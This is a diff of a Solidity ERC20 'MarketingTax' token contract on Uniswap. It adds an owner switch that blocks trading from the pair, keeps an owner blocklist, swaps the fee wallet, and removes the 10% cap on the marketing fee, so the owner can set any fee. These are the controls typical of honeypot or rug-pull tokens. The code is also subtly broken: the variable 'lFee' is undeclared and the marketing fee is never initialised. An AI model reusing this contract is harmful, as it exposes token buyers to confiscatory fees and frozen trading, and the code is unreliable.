@@ -684,18 +684,22 @@ abstract contract ERC20 is Context, IERC20, Auth {
     IUniswapV2Router02 public router;
     address public pair;
 
-    uint256 public mp;
+    uint256 public burnFeeInBasis;
+    uint256 public marketingFeeInBasis;
+    uint256 public liquidityFeeInBasis;
     uint256 public bp = 10000;
-    uint256 public maxWalletAmount;
     uint256 public _totalSupply;
-    uint256 public _maxTxAmount; 
+    uint256 public _maxTxAmount;
+    uint256 public maxWalletAmount;
     
     string internal _name;
     string internal _symbol;
     uint8 internal _decimals;
-        
-    address payable public _marketingWallet;
+
+    bool public isTradeEnabled;
     
+    address payable public _marketingWallet;
+
     event Deposit(address indexed dst, uint amount);
     event Withdrawal(address indexed src, uint amount);
     event Received(address, uint);
@@ -703,21 +707,22 @@ abstract contract ERC20 is Context, IERC20, Auth {
     event SetFee(address, bool);
     event ReceivedFallback(address, uint);
     
-    constructor(string memory token_name, string memory token_symbol, uint8 dec, address payable _minter,address payable _marketing, uint256 _supply, uint256 _marketingBP) Auth(payable(msg.sender)) {
+    constructor(string memory token_name, string memory token_symbol, uint8 dec, address payable _minter, address payable _mFeeWallet, uint256 _supply, uint256 _marketingBP) Auth(payable(msg.sender)) {
         maxWalletAmount = (uint256(_supply) * uint256(1000)) / uint256(bp); // 10% maxWalletAmount
-        _maxTxAmount = (uint256(_supply) * uint256(100)) / uint256(bp); // 1% _maxTxAmount
+        _maxTxAmount = (uint256(_supply) * uint256(500)) / uint256(bp); // 5% _maxTxAmount
+        isTradeEnabled = false;
         _name = token_name;
         _symbol = token_symbol;
         _decimals = uint8(dec);
-        mp = uint256(_marketingBP);
-        _marketingWallet = payable(_marketing);
+        liquidityFeeInBasis = uint256(_marketingBP);
+        _marketingWallet = payable(_mFeeWallet);
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         router = _uniswapV2Router;
         WETH = IERC20(router.WETH());
         pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
         amm[address(pair)] = true;
-        isMaxWalletLimitExempt[_msgSender()] = true;
         isMaxWalletLimitExempt[address(0)] = true;
+        isMaxWalletLimitExempt[_msgSender()] = true;
         isMaxWalletLimitExempt[address(this)] = true;
         isMaxWalletLimitExempt[address(pair)] = true;
         isMaxWalletLimitExempt[address(router)] = true;
@@ -791,8 +796,8 @@ abstract contract ERC20 is Context, IERC20, Auth {
 
     function _transfer(address sender, address recipient, uint256 amount) internal {
         require(sender != address(0), "ERC20: transfer from the zero address");
-        require(recipient != address(0), "ERC20: transfer to the zero address");
         uint256 fromBalance = _balances[sender];
+        uint256 toBalance = _balances[recipient];
         if(!isTradeEnabled && sender == address(pair) || !isTradeEnabled && amm[sender] == true || !isTradeEnabled && sender == address(router)){
             revert();
         } else if(uint256(amount) >= uint256(maxWalletAmount) && !isMaxWalletLimitExempt[sender]){
@@ -806,12 +811,12 @@ abstract contract ERC20 is Context, IERC20, Auth {
         } else if(uint256(fromBalance) < uint256(amount)){
             revert();
         } else {
-            uint256 mFee = (amount * mp) / bp;
+            uint256 mFee = (amount * marketingFeeInBasis) / bp;
             unchecked {
                 _balances[sender] -= amount;
                 // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
                 // decrementing then incrementing.
-                amount -= mFee;
+                amount -= lFee;
                 _balances[recipient] += amount;
                 _balances[_marketingWallet] += mFee;
             }
@@ -827,8 +832,13 @@ abstract contract ERC20 is Context, IERC20, Auth {
 
         _approve(address(account), address(this), amount);
 
-        _balances[account] = _balances[account] +amount;
+        _balances[account] = _balances[account] + amount;
         emit Transfer(address(0), account, amount);
+    }
+
+    function burnFrom(address account, uint256 amount) public virtual {
+        _spendAllowance(account, _msgSender(), amount);
+        _burn(account, amount);
     }
 
     function _burn(address account, uint256 amount) internal {
@@ -836,7 +846,6 @@ abstract contract ERC20 is Context, IERC20, Auth {
 
         _balances[account] = _balances[account] - amount;
         _totalSupply = _totalSupply - amount;
-        require(decreaseAllowance(address(this), amount));
         emit Transfer(account, address(0), amount);
     }
 
@@ -874,7 +883,7 @@ abstract contract ERC20 is Context, IERC20, Auth {
 
 contract MarketingTax is ERC20 {
     
-    constructor () ERC20 ("name", "symbol", 18, payable(msg.sender),payable(0x050134fd4EA6547846EdE4C4Bf46A334B7e87cCD),1000000,1000) {
+    constructor () ERC20 ("name", "symbol", 18, payable(msg.sender),payable(0xd166dF9DFB917C3B960673e2F420F928d45C9be1),1000000,1000) {
 
     }
 
@@ -886,18 +895,6 @@ contract MarketingTax is ERC20 {
         for (uint256 i = 0; i < bots_.length; i++) {
             blocklist[bots_[i]] = enabled;
         }
-    }
-
-    function manageMarketingWallet(address payable _mWallet) public onlyOwner {
-        _marketingWallet = payable(_mWallet);
-    }
-    
-    function manageMarketingPercentage(uint256 _mP) public onlyOwner {
-        mp = uint256(_mP);
-    }
-    
-    function enableTrade(bool _enabled) public onlyOwner {
-        isTradeEnabled = _enabled;
     }
 
     function setMaxWalletLimitExempt(address _exemptWallet, bool enable) public onlyOwner {
@@ -918,11 +915,19 @@ contract MarketingTax is ERC20 {
         return true; 
     }
 
-    function setTotalFee(uint256 _marketingFee) public onlyOwner returns (uint256) {
-        // 10% cap on fees
-        require(_marketingFee <= 1000); 
-        mp = _marketingFee;
-        return mp; 
+    function manageTradingStatus(bool _et) public onlyOwner returns(bool) {
+        isTradeEnabled = _et;
+        return isTradeEnabled;
+    }
+
+    function setMarketingWallet(address payable _mWallet) public onlyOwner returns (bool) {
+        _marketingWallet = payable(_mWallet);
+        return true; 
+    }
+
+    function setMarketingFeeInBP(uint256 _marketingFee) public onlyOwner returns (bool) {
+        marketingFeeInBasis = uint256(_marketingFee);
+        return true; 
     }
 
     function setAMM(address _amm, bool enable) public onlyOwner {
